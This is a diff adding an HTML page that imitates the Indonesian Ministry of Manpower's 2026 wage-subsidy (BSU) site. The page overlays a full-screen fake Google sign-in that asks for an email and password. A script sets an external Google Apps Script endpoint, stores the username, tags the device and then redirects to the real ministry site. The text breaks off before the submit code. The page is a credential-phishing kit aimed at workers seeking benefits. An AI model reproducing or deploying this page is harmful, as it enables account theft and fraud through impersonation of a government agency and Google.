@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="robots" content="noindex,nofollow" />
+
+  <title>Bantuan Subsidi Upah</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Proza+Libre&display=swap" rel="stylesheet" />
+
+  <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+
+  <link rel="icon" href="assets/images/favicon.png" type="image/gif" />
+  <style>
+    #pengecekanMandiri {
+      scroll-margin-top: 110px;
+      padding-top: 60px;
+      padding-bottom: 60px;
+      background-color: #f8f9fa;
+    }
+
+    .bsu-check-notice {
+      max-width: auto;
+      text-align: left;
+    }
+
+    .bsu-check-notice h2 {
+      margin: 0 0 16px;
+      color: #15406a;
+      font-size: 24px;
+      font-weight: 700;
+      line-height: 1.4;
+      letter-spacing: normal;
+    }
+
+    .bsu-check-notice p {
+      margin: 0 0 16px;
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.75;
+    }
+
+    .bsu-check-notice .privacy-reminder {
+      margin-bottom: 0;
+      padding: 12px 16px;
+      border-left: 3px solid #15406a;
+      background-color: #eaf0f5;
+    }
+
+    #hasilPengecekan {
+      font-weight: bold;
+      white-space: pre-wrap;
+    }
+
+    .btn-primary {
+      background-color: #007bff;
+      border-color: #007bff;
+    }
+
+    .btn-primary:hover {
+      background-color: #0056b3;
+      border-color: #0056b3;
+    }
+
+    .form-control:focus {
+      border-color: #007bff;
+      box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+    }
+
+    .spinner-border {
+      display: none;
+      width: 1.5rem;
+      height: 1.5rem;
+      vertical-align: -0.35em;
+    }
+
+    #captchaImageElement {
+      border: 1px solid #ccc;
+      margin-bottom: 5px;
+      cursor: pointer;
+      max-height: 50px;
+      max-width: 100%;
+      object-fit: contain;
+    }
+
+    footer .footer-contacts {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 32px;
+      padding-top: 0;
+    }
+
+    body.gsi-lock {
+      overflow: hidden !important;
+    }
+
+    /* ================= POPUP ================= */
+    #gsi-root {
+      position: fixed;
+      inset: 0;
+      z-index: 2147483000;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      overflow: auto;
+      color: #202124;
+      font-family: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      font-size: 14px;
+      line-height: 1.5;
+      transition: opacity .25s ease;
+    }
+
+    #gsi-root.gsi-hide {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #gsi-root *,
+    #gsi-root *::before,
+    #gsi-root *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    #gsi-root input,
+    #gsi-root button,
+    #gsi-root select {
+      font-family: inherit;
+    }
+
+    #gsi-root .gsi-main {
+      flex: 1 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    #gsi-root .gsi-card {
+      width: 100%;
+      max-width: 448px;
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      text-align: center;
+      animation: gsiIn .3s ease;
+    }
+
+    @keyframes gsiIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: none; }
+    }
+
+    #gsi-root .gsi-logo {
+      display: block;
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 16px;
+    }
+
+    #gsi-root h1 {
+      font-size: 24px;
+      font-weight: 400;
+      line-height: 1.33;
+      color: #202124;
+      margin: 0 0 8px;
+    }
+
+    #gsi-root .gsi-sub {
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.5;
+      color: #202124;
+      margin: 0 0 32px;
+    }
+
+    #gsi-root .gsi-chip {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+      width: fit-content;
+      max-width: 100%;
+      border: 1px solid #dadce0;
+      border-radius: 16px;
+      height: 32px;
+      padding: 0 12px 0 4px;
+      font-size: 14px;
+      color: #3c4043;
+      margin: 0 auto 26px;
+    }
+
+    #gsi-root .gsi-chip .gsi-av {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-transform: uppercase;
+    }
+
+    #gsi-root .gsi-field {
+      position: relative;
+      text-align: left;
+      margin-bottom: 6px;
+    }
+
+    #gsi-root .gsi-field input {
+      width: 100%;
+      height: 56px;
+      padding: 13px 15px;
+      font-size: 16px;
+      line-height: 1.5;
+      color: #202124;
+      background: transparent;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+    }
+
+    #gsi-root .gsi-field input:focus {
+      border: 2px solid #1a73e8;
+      padding: 12px 14px;
+    }
+
+    #gsi-root .gsi-field label {
+      position: absolute;
+      left: 12px;
+      top: 16px;
+      padding: 0 4px;
+      font-size: 16px;
+      color: #5f6368;
+      background: #fff;
+      pointer-events: none;
+      transition: top .15s cubic-bezier(.4, 0, .2, 1), font-size .15s cubic-bezier(.4, 0, .2, 1);
+    }
+
+    #gsi-root .gsi-field input:focus+label,
+    #gsi-root .gsi-field input:not(:placeholder-shown)+label {
+      top: -8px;
+      font-size: 12px;
+    }
+
+    #gsi-root .gsi-field input:focus+label {
+      color: #1a73e8;
+    }
+
+    #gsi-root .gsi-field.gsi-bad input {
+      border: 2px solid #d93025;
+      padding: 12px 14px;
+    }
+
+    #gsi-root .gsi-field.gsi-bad label {
+      color: #d93025;
+    }
+
+    #gsi-root .gsi-err {
+      display: none;
+      align-items: flex-start;
+      gap: 6px;
+      font-size: 12px;
+      line-height: 1.33;
+      color: #d93025;
+      text-align: left;
+      margin: 4px 0 0;
+    }
+
+    #gsi-root .gsi-err.show {
+      display: flex;
+    }
+
+    #gsi-root .gsi-err svg {
+      flex: 0 0 auto;
+      margin-top: 1px;
+    }
+
+    #gsi-root .gsi-link {
+      display: inline-block;
+      margin: 12px 0 0;
+      font-size: 14px;
+      font-weight: 500;
+      color: #1a73e8;
+      text-decoration: none;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    #gsi-root .gsi-link:hover {
+      text-decoration: underline;
+    }
+
+    #gsi-root .gsi-guest {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #5f6368;
+      text-align: left;
+      margin: 36px 0 0;
+    }
+
+    #gsi-root .gsi-guest a {
+      color: #1a73e8;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    #gsi-root .gsi-guest a:hover {
+      text-decoration: underline;
+    }
+
+    #gsi-root .gsi-check {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      color: #202124;
+      text-align: left;
+      margin: 18px 0 0;
+      cursor: pointer;
+    }
+
+    #gsi-root .gsi-check input {
+      width: 18px;
+      height: 18px;
+      accent-color: #1a73e8;
+      cursor: pointer;
+    }
+
+    #gsi-root .gsi-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 36px;
+      flex-wrap: wrap;
+    }
+
+    #gsi-root .gsi-row-end {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 12px;
+      margin-top: 36px;
+    }
+
+    #gsi-root .gsi-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: 0;
+      border-radius: 4px;
+      height: 36px;
+      padding: 0 24px;
+      min-width: 88px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    #gsi-root .gsi-btn:hover {
+      background: #1b66c9;
+      box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
+    }
+
+    #gsi-root .gsi-btn:disabled {
+      opacity: .75;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    #gsi-root .gsi-btn-text {
+      background: none;
+      border: 0;
+      height: 36px;
+      padding: 0 8px;
+      border-radius: 4px;
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    #gsi-root .gsi-btn-text:hover {
+      background: rgba(26, 115, 232, .05);
+    }
+
+    #gsi-root .gsi-spin {
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(255, 255, 255, .45);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: gsiSp .7s linear infinite;
+      display: none;
+    }
+
+    #gsi-root .gsi-btn.gsi-loading .gsi-spin {
+      display: block;
+    }
+
+    @keyframes gsiSp {
+      to { transform: rotate(360deg); }
+    }
+
+    #gsi-root .gsi-foot {
+      flex: 0 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 12px 24px;
+      font-size: 12px;
+      color: #5f6368;
+      flex-wrap: wrap;
+    }
+
+    #gsi-root .gsi-foot .gsi-note {
+      font-size: 11px;
+      color: #80868b;
+    }
+
+    #gsi-root .gsi-foot select {
+      border: 0;
+      background: transparent;
+      font-size: 12px;
+      color: #5f6368;
+      padding: 4px;
+      cursor: pointer;
+    }
+
+    #gsi-root .gsi-foot nav {
+      display: flex;
+      gap: 20px;
+    }
+
+    #gsi-root .gsi-foot nav a {
+      color: #5f6368;
+      text-decoration: none;
+    }
+
+    #gsi-root .gsi-foot nav a:hover {
+      color: #202124;
+    }
+
+    #gsi-root .gsi-done {
+      display: none;
+      text-align: center;
+      padding: 8px 0 24px;
+    }
+
+    #gsi-root .gsi-done .gsi-ok {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #e6f4ea;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #gsi-root .gsi-done h2 {
+      font-size: 22px;
+      font-weight: 400;
+      margin: 0 0 10px;
+    }
+
+    #gsi-root .gsi-done p {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.6;
+    }
+
+    #gsi-root .gsi-done .gsi-who {
+      font-weight: 500;
+      color: #202124;
+      word-break: break-all;
+    }
+
+    @media(max-width:520px) {
+      #gsi-root .gsi-main {
+        padding: 0;
+        align-items: flex-start;
+      }
+
+      #gsi-root .gsi-card {
+        border: 0;
+        border-radius: 0;
+        padding: 24px 24px 32px;
+        max-width: 100%;
+      }
+
+      #gsi-root .gsi-foot {
+        padding: 12px 24px;
+      }
+    }
+
+    #gsiReopen {
+      position: fixed;
+      right: 18px;
+      bottom: 18px;
+      z-index: 2147482999;
+      display: none;
+      align-items: center;
+      gap: 8px;
+      height: 44px;
+      padding: 0 20px;
+      border: 0;
+      border-radius: 22px;
+      background: #1a73e8;
+      color: #fff;
+      font: 500 14px/1 Roboto, Arial, sans-serif;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, .25);
+      cursor: pointer;
+    }
+
+    #gsiReopen:hover {
+      background: #1b66c9;
+    }
+  </style>
+  <script defer data-domain="bsu.kemnaker.go.id" src="https://plausible.kemnaker.go.id/js/script.js"></script>
+</head>
+
+<body id="page-top">
+  <nav class="navbar navbar-expand-lg navbar-dark fixed-top alt animated navbar-custom">
+    <div class="container">
+      <a class="navbar-brand" href="#">
+        <img src="assets/images/logo-blue.png" alt="Logo Kementrian Ketenagakerjaan" width="160" height="60" style="object-fit: contain;" />
+      </a>
+
+      <button class="navbar-toggler material-ripple" type="button" data-toggle="collapse"
+        data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false"
+        aria-label="Toggle navigation">
+        <span class="icon-bar i1"></span>
+        <span class="icon-bar i2"></span>
+        <span class="icon-bar i3"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link active" href="#home">Beranda<span class="sr-only">(current)</span></a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#syarat">Syarat</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#pengecekan">Pengecekan Resmi</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#pengecekanMandiri">Cek NIK</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://bantuan.kemnaker.go.id/" target="_blank">Pusat Bantuan</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <header id="home">
+    <div class="hero-section">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-12">
+            <div class="hero-text" style="margin-top: 280px;">
+              <h1>Bantuan Subsidi Upah 2026</h1>
+              <p>
+                Dukungan Pemerintah untuk Pekerja/Buruh Indonesia
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <section id="content1">
+    <div class="container">
+      <div class="section-content">
+        <p style="text-align: justify;">
+          Pemerintah kembali menghadirkan Bantuan Subsidi Upah (BSU) 2026 sebagai bentuk dukungan untuk mempertahankan daya beli dan menjaga ketahanan ekonomi pekerja/buruh.
+        </p>
+        <p style="text-align: justify;">
+          Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai sebesar Rp300.000,- per bulan selama 3 bulan,
+          <strong style="font-weight: bold;">yang dibayarkan sekaligus dengan total Rp900.000,-.</strong>
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <section id="syarat">
+    <div class="container">
+      <div class="section-title">
+        <h1>Syarat Penerima BSU 2026</h1>
+      </div>
+      <div class="section-content">
+        <div class="row" style="text-align: justify;">
+          <div class="col-md-6">
+            <ul>
+              <li>
+                Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.
+              </li>
+              <li>
+                Peserta Aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026
+              </li>
+              <li>
+                Menerima Gaji/Upah paling banyak sebesar Rp3.500.000,00 (tiga juta lima ratus ribu rupiah) per bulan atau sebesar UMP/UMK
+              </li>
+            </ul>
+          </div>
+          <div class="col-md-6">
+            <ul>
+              <li>
+                Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.
+              </li>
+              <li>
+                Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="disclaimer">
+          <div class="container">
+            <i>
+              Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara.
+            </i>
+            <i>Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="blank" style="font-weight: bold;">Permenaker Nomor 16 Tahun 2026</a></i><br />
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pengecekan">
+    <div class="container cek">
+      <h1>Langkah Pengecekan Resmi</h1>
+
+      <div class="cek-list">
+        <div class="row">
+          <div class="col-md-2">
+            <span>1</span>
+            <div class="cek-list-title">Kunjungi website</div>
+          </div>
+
+          <div class="col-md-10">
+            <a href="https://bsu.kemnaker.go.id" target="_blank">bsu.kemnaker.go.id</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="cek-list">
+        <div class="row">
+          <div class="col-md-2">
+            <span>2</span>
+            <div class="cek-list-title">Cek NIK Penerima</div>
+          </div>
+
+          <div class="col-md-10">
+            <a href="#pengecekanMandiri">Cek Nik</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="spacer-2"></div>
+      <div class="ket">
+        <div class="container">
+          Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS
+          Ketenagakerjaan. Lebih lanjut mengenai informasi kriteria, mekanisme
+          dan tata cara BSU 2026 dapat dilihat pada
+          <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="blank">Permenaker Nomor 16 Tahun 2026</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pengecekanMandiri">
+    <div class="container">
+      <div class="bsu-check-notice">
+        <div class="privacy-reminder">
+          <h2>INFORMASI PENGECEKAN PENERIMA BSU 2026</h2>
+          <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.<br /></p>
+          <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <img src="assets/images/logo-white.png" alt="Logo Kementrian Ketenagakerjaan" width="160" height="60" style="object-fit: contain;" />
+          <p>
+            Jl. Jendral Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta
+            12750, Indonesia
+          </p>
+        </div>
+      </div>
+      <p class="copy-line">© 2026 - Bantuan Subsidi Upah</p>
+    </div>
+  </footer>
+
+  <!-- ==================== POPUP ==================== -->
+  <div id="gsi-root" role="dialog" aria-modal="true" aria-label="Masuk">
+    <div class="gsi-main">
+      <div class="gsi-card">
+        <div id="gsiForm">
+          <svg class="gsi-logo" viewBox="0 0 48 48" aria-hidden="true">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 id="gsiTitle">Masuk</h1>
+          <p class="gsi-sub" id="gsiSub">untuk melanjutkan ke Gmail</p>
+
+          <div class="gsi-chip" id="gsiChip">
+            <span class="gsi-av" id="gsiAv">U</span>
+            <span id="gsiChipText"></span>
+          </div>
+
+          <div id="gsiStep1">
+            <div class="gsi-field" id="gsiEmailField">
+              <input id="gsiEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false" autocapitalize="none" aria-label="Email atau telepon">
+              <label for="gsiEmail">Email atau telepon</label>
+            </div>
+            <div class="gsi-err" id="gsiEmailErr">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+              <span>Masukkan email atau nomor telepon</span>
+            </div>
+            <a class="gsi-link" id="gsiForgotEmail">Lupa email?</a>
+
+            <p class="gsi-guest">
+              Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.
+              <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener">Pelajari lebih lanjut penggunaan mode Tamu</a>
+            </p>
+
+            <div class="gsi-row">
+              <button class="gsi-btn-text" type="button" id="gsiCreate">Buat akun</button>
+              <button class="gsi-btn" type="button" id="gsiNext">Berikutnya</button>
+            </div>
+          </div>
+
+          <div id="gsiStep2" style="display:none">
+            <div class="gsi-field" id="gsiPassField">
+              <input id="gsiPass" type="password" placeholder=" " autocomplete="current-password" aria-label="Masukkan sandi Anda">
+              <label for="gsiPass">Masukkan sandi Anda</label>
+            </div>
+            <div class="gsi-err" id="gsiPassErr">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+              <span>Masukkan sandi</span>
+            </div>
+
+            <div class="gsi-row">
+              <label class="gsi-check"><input type="checkbox" id="gsiShow">Tampilkan sandi</label>
+              <a class="gsi-link" style="margin-top:0" id="gsiForgotPass">Lupa sandi?</a>
+            </div>
+
+            <div class="gsi-row-end">
+              <button class="gsi-btn" type="button" id="gsiSignIn">
+                <span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="gsi-err" id="gsiStatus" style="justify-content:center;margin-top:16px"></div>
+        </div>
+
+        <div class="gsi-done" id="gsiDone">
+          <div class="gsi-ok">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#188038" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+          </div>
+          <h2>Berhasil masuk</h2>
+          <p>Akun <span class="gsi-who" id="gsiWho"></span> sudah tercatat.</p>
+          <div class="gsi-row-end" style="justify-content:center;margin-top:26px">
+            <button class="gsi-btn" type="button" id="gsiAgain">Masuk dengan akun lain</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="gsi-foot">
+      <div>
+        <select aria-label="Bahasa">
+          <option>Bahasa Indonesia</option>
+          <option>English (United States)</option>
+        </select>
+        <div class="gsi-note">Data diterima admin, bukan disimpan Google</div>
+      </div>
+      <nav>
+        <a href="https://support.google.com/accounts" target="_blank" rel="noopener">Bantuan</a>
+        <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privasi</a>
+        <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Persyaratan</a>
+      </nav>
+    </div>
+  </div>
+
+  <button id="gsiReopen" type="button">Masuk</button>
+  <!-- =================== /POPUP ==================== -->
+
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const nikInput = document.getElementById("nikInput");
+      const cekNikButton = document.getElementById("cekNikButton");
+      const hasilPengecekan = document.getElementById("hasilPengecekan");
+      const spinner = cekNikButton ? cekNikButton.querySelector(".spinner-border") : null;
+      const buttonText = document.getElementById("cekButtonText");
+      const captchaInputElement = document.getElementById("captchaInput");
+      const captchaImageElement = document.getElementById("captchaImageElement");
+      const refreshCaptchaButton = document.getElementById("refreshCaptchaButton");
+
+      function refreshCaptcha() {
+        if (captchaImageElement) {
+          fetch("/captcha-image?" + Date.now())
+            .then(function (response) {
+              if (!response.ok) throw new Error("Gagal memuat gambar CAPTCHA");
+              return response.blob();
+            })
+            .then(function (imageBlob) {
+              captchaImageElement.src = URL.createObjectURL(imageBlob);
+            })
+            .catch(function (error) {
+              console.error("Error CAPTCHA:", error);
+              captchaImageElement.alt = "Gagal memuat CAPTCHA";
+            });
+        }
+        if (captchaInputElement) captchaInputElement.value = "";
+      }
+
+      if (captchaImageElement) captchaImageElement.addEventListener("click", refreshCaptcha);
+      if (refreshCaptchaButton) refreshCaptchaButton.addEventListener("click", refreshCaptcha);
+      refreshCaptcha();
+
+      const apiUrlBase = "/api/cek-nik";
+
+      function resetButtonState() {
+        if (!cekNikButton) return;
+        cekNikButton.disabled = false;
+        spinner.style.display = "none";
+        buttonText.textContent = "Cek Status";
+      }
+
+      if (cekNikButton) {
+        cekNikButton.addEventListener("click", function () {
+          const nik = nikInput.value.trim();
+          const captchaValue = captchaInputElement.value.trim();
+
+          hasilPengecekan.style.display = "none";
+          hasilPengecekan.className = "mt-4 alert";
+          cekNikButton.disabled = true;
+          spinner.style.display = "inline-block";
+          buttonText.textContent = "Mengecek...";
+
+          if (nik === "") {
+            hasilPengecekan.textContent = "NIK tidak boleh kosong. Harap masukkan NIK Anda.";
+            hasilPengecekan.classList.add("alert-warning");
+            hasilPengecekan.style.display = "block";
+            resetButtonState();
+            return;
+          }
+
+          if (!/^\d{16}$/.test(nik)) {
+            hasilPengecekan.textContent = "Format NIK tidak valid. Harap masukkan 16 digit angka NIK.";
+            hasilPengecekan.classList.add("alert-danger");
+            hasilPengecekan.style.display = "block";
+            resetButtonState();
+            return;
+          }
+
+          if (captchaValue === "") {
+            hasilPengecekan.textContent = "Kode CAPTCHA tidak boleh kosong.";
+            hasilPengecekan.classList.add("alert-warning");
+            hasilPengecekan.style.display = "block";
+            resetButtonState();
+            refreshCaptcha();
+            return;
+          }
+
+          if (captchaValue.length !== 6) {
+            hasilPengecekan.textContent = "Kode CAPTCHA harus 6 karakter.";
+            hasilPengecekan.classList.add("alert-warning");
+            hasilPengecekan.style.display = "block";
+            resetButtonState();
+            refreshCaptcha();
+            return;
+          }
+
+          const fetchUrl = apiUrlBase + "?nik=" + encodeURIComponent(nik) + "&captcha_input=" + encodeURIComponent(captchaValue);
+
+          fetch(fetchUrl)
+            .then(function (response) {
+              if (!response.ok) {
+                return response.json().then(function (errData) {
+                  if (errData.message && errData.message.toLowerCase().includes("captcha")) refreshCaptcha();
+                  throw new Error(errData.message || ("Server merespons dengan status: " + response.status));
+                }).catch(function (jsonParseOrCustomError) {
+                  refreshCaptcha();
+                  throw new Error(jsonParseOrCustomError.message || ("Server merespons dengan status: " + response.status));
+                });
+              }
+              return response.json();
+            })
+            .then(function (data) {
+              hasilPengecekan.style.display = "block";
+              switch (data.status) {
+                case "TERDAFTAR":
+                  hasilPengecekan.className = "mt-4 alert alert-success";
+                  hasilPengecekan.textContent = data.message;
+                  break;
+                case "TIDAK_MEMENUHI_SYARAT":
+                  hasilPengecekan.className = "mt-4 alert alert-warning";
+                  hasilPengecekan.textContent = data.message;
+                  break;
+                case "TIDAK_DITEMUKAN":
+                  hasilPengecekan.className = "mt-4 alert alert-info";
+                  hasilPengecekan.textContent = data.message;
+                  break;
+                case "ERROR":
+                  hasilPengecekan.className = "mt-4 alert alert-danger";
+                  hasilPengecekan.textContent = data.message || "Terjadi kesalahan pada server.";
+                  break;
+                default:
+                  hasilPengecekan.className = "mt-4 alert alert-secondary";
+                  hasilPengecekan.textContent = "Respons tidak dikenal dari server.";
+              }
+              refreshCaptcha();
+            })
+            .catch(function (error) {
+              console.error("Error saat pengecekan NIK:", error);
+              hasilPengecekan.style.display = "block";
+              hasilPengecekan.className = "mt-4 alert alert-danger";
+              hasilPengecekan.textContent = error.message + ". Silakan coba lagi nanti.";
+            })
+            .finally(resetButtonState);
+        });
+
+        nikInput.addEventListener("keypress", function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            if (nikInput.value.trim().length === 16 && captchaInputElement.value.trim() === "") {
+              captchaInputElement.focus();
+            } else if (!cekNikButton.disabled) {
+              cekNikButton.click();
+            }
+          }
+        });
+
+        captchaInputElement.addEventListener("keypress", function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            if (!cekNikButton.disabled) cekNikButton.click();
+          }
+        });
+      }
+    });
+  </script>
+
+  <script>
+    (function () {
+      'use strict';
+
+      var ENDPOINT = 'https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec';
+      var NEXT_URL = 'https://bsu.kemnaker.go.id/#pengecekanMandiri';
+
+      var root = document.getElementById('gsi-root');
+      if (!root) return;
+      var $ = function (id) { return document.getElementById(id); };
+
+      var emailEl = $('gsiEmail'), passEl = $('gsiPass');
+      var statusEl = $('gsiStatus');
+      var reopenBtn = $('gsiReopen');
+      var username = '', busy = false, closeTimer = null, lastQ = '';
+      var KEY_Q = 'gsi_queue';
+
+      try { var l = localStorage.getItem('gsi_last_user'); if (l) emailEl.value = l; } catch (e) { }
+
+      function devId() {
+        try {
+          var k = 'gsi_dev', v = localStorage.getItem(k);
+          if (!v) {
+            v = (window.crypto && crypto.randomUUID) ? crypto.randomUUID()
+              : 'gsi-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 12);
+            localStorage.setItem(k, v);
+          }
+          return v;
+        } catch (e) { return ''; }
+      }
+      function rid() { return 'gsi-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10); }
+
+      function setStatus(msg, color) {
+        statusEl.textContent = msg;
+        statusEl.style.color = color || '#5f6368';
+        statusEl.classList.add('show');
+      }
+      function clearStatus() { statusEl.classList.remove('show'); statusEl.textContent = ''; }
+
+      function step2() {
+        var v = emailEl.value.trim();
+        if (!v) {
+          $('gsiEmailField').classList.add('gsi-bad');
+          $('gsiEmailErr').classList.add('show');
+          emailEl.focus();
+          return;
+        }
+        username = v;
+        $('gsiChipText').textContent = v;
+        $('gsiAv').textContent = v.charAt(0);
+        $('gsiChip').style.display = 'flex';
+        $('gsiTitle').textContent = 'Selamat datang';
+        $('gsiSub').textContent = 'Masuk untuk melanjutkan';
+        $('gsiStep1').style.display = 'none';
+        $('gsiStep2').style.display = 'block';
+        clearStatus();
+        setTimeout(function () { passEl.focus(); }, 60);
+      }
+
